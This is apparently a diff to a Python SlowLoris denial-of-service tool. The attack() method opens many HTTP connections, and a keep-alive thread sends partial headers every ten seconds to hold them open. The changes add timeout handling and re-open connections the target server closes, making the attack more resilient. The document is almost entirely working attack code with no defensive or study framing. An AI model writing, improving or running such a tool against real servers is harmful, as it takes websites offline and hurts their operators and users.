@@ -13,19 +13,21 @@ class SlowLoris:
 
     def __init__(self):
         self.connections = []
-        self.connection_count = 0
+        self.recreated_connections = 0
         self.keepalive_thread = threading.Thread(target=self.keep_alive)
         self.keepalive_thread.setDaemon(True)
         self.keepalive_thread.start()
 
     def attack(self, host, port, count):
         """Starts the attack."""
-        self.connection_count = count
         print("Initializing {} connections.".format(count))
         # Start 'count' connections and send the initial HTTP headers.
         for _ in range(count):
-            conn = LorisConnection(host, port).send_headers(DEFAULT_USER_AGENT)
-            self.connections.insert(0, conn)
+            try:
+                conn = LorisConnection(host, port).send_headers(DEFAULT_USER_AGENT)
+                self.connections.insert(0, conn)
+            except TimeoutError:
+                pass
 
     def stop(self):
         """Stops the attack."""
@@ -36,16 +38,26 @@ class SlowLoris:
         """Make sure that connections stay alive once established."""
         while True:
             time.sleep(10)
-            print("Sending keep-alive headers for {} connections.".format(self.connection_count))
+            connection_count = len(self.connections)
+            print("Sending keep-alive headers for {} connections.".format(connection_count))
             # Every 10 seconds, send HTTP nonsense to prevent the connection from timing out.
-            for i in range(0, self.connection_count):
+            for i in range(0, connection_count):
                 try:
                     self.connections[i].keep_alive()
-                # If the server closed one of our connections, re-open the connection in it's place.
                 except KeyboardInterrupt:
                     raise
                 # pylint: disable=W0702
+                # If the server closed one of our connections,
+                # re-open the connection in its place.
                 except:
+                    threshold = connection_count // 20
+                    if self.recreated_connections > threshold:
+                        print("Recreated {} connections.".format(self.recreated_connections))
+                        self.recreated_connections -= threshold
                     host, port = (self.connections[i].host, self.connections[i].port)
-                    conn = LorisConnection(host, port).send_headers(DEFAULT_USER_AGENT)
-                    self.connections[i] = conn
+                    try:
+                        conn = LorisConnection(host, port).send_headers(DEFAULT_USER_AGENT)
+                        self.connections[i] = conn
+                        self.recreated_connections += 1
+                    except TimeoutError:
+                        pass
